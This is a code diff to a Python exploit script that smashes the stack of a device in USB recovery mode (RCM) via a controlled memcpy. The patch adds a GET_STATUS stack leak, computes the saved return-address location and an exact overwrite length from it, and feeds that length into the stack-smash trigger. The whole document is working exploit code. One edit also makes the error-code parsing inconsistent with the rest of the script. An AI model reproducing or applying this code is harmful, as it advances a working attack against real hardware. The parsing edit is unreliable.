@@ -34,12 +34,14 @@ import ctypes
 import argparse
 import platform
 import binascii
+import struct
 
 USB_XFER_MAX = 0x1000
 
 RCM_V1_HEADER_SIZE = 116
 RCM_V35_HEADER_SIZE = 628
-RCM_V40_HEADER_SIZE = 680
+RCM_V40_HEADER_SIZE = 644
+RCM_V4P_HEADER_SIZE = 680
 
 
 # The address where the RCM payload is placed.
@@ -132,6 +134,11 @@ class HaxBackend:
         return bytes(self.dev.read(0x81, length, 1000))
 
 
+    def read_ep0(self, length):
+
+        # Triggering the vulnerability is simplest on macOS; we simply issue the control request as-is.
+        return bytes(self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, self.GET_STATUS, 0, 0, length))
+
     def write_single_buffer(self, data):
         """
         Writes a single RCM buffer, which should be USB_XFER_MAX long.
@@ -167,9 +174,7 @@ class MacOSBackend(HaxBackend):
 
         # Triggering the vulnerability is simplest on macOS; we simply issue the control request as-is.
         r = self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, self.GET_STATUS, 0, 0, length)
-        print("ctrl res:")
-        print(r)
-        return r
+        return bytes(r)
 
 
 
@@ -462,7 +467,6 @@ class RCMHax:
     DEFAULT_PID = 0x7330
 
     # Exploit specifics
-    # COPY_BUFFER_ADDRESSES   = [0x40003000, 0x40003000]   # The addresses of the DMA buffers we can trigger a copy _from_.
     COPY_BUFFER_ADDRESSES   = [0x40003000, 0x40005000]   # The addresses of the DMA buffers we can trigger a copy _from_.
     STACK_END               = 0x4000A000                 # The address just after the end of the device's stack.
 
@@ -552,7 +556,8 @@ class RCMHax:
             print("USBError: {}".format(err))
             rcm_err = self.read(4)
             # print("RCM error buf: {}".format(rcm_err))
-            rcm_err_int = ctypes.c_uint32.from_buffer_copy(rcm_err).value
+            # rcm_err_int = ctypes.c_uint32.from_buffer_copy(rcm_err).value
+            rcm_err_int = struct.unpack('>I', rcm_err)
             # print("RCM error buf: 0x{:08x}".format(rcm_err_int))
             raise RCMError(rcm_err_int)
 
@@ -572,6 +577,9 @@ class RCMHax:
     def read_device_id(self):
         """ Reads the Device ID via RCM. Only valid at the start of the communication. """
         return self.read(16)
+
+    def read_stack(self):
+        return self.backend.read_ep0(0x10)
 
 
     def switch_to_highbuf(self):
@@ -638,6 +646,17 @@ except OSError as e:
     # Raise the exception only if we're not being permissive about ID reads.
     if not arguments.permissive_id:
         raise e
+
+stack_snapshot = switch.read_stack()
+print("Stack snapshot: {}".format(binascii.hexlify(stack_snapshot)))
+EndpointStatus_stack_addr = struct.unpack('<I', stack_snapshot[0xC:0xC+4])[0]
+print("EndpointStatus_stack_addr: 0x{:08x}".format(EndpointStatus_stack_addr))
+ProcessSetupPacket_SP = EndpointStatus_stack_addr - 0xC
+print("ProcessSetupPacket SP: 0x{:08x}".format(ProcessSetupPacket_SP))
+InnerMemcpy_LR_stack_addr = ProcessSetupPacket_SP - 2 * 4 - 2 * 4
+print("InnerMemcpy LR stack addr: 0x{:08x}".format(InnerMemcpy_LR_stack_addr))
+overwrite_len = InnerMemcpy_LR_stack_addr - 0x40005000
+print("overwrite_len: 0x{:08x}".format(overwrite_len))
 
 
 # Prefix the image with an RCM command, so it winds up loaded into memory
@@ -713,7 +732,7 @@ switch.switch_to_highbuf()
 # Smash the device's stack, triggering the vulnerability.
 print("Smashing the stack...")
 try:
-    switch.trigger_controlled_memcpy()
+    switch.trigger_controlled_memcpy(overwrite_len)
 except ValueError as e:
     print(str(e))
 except IOError:
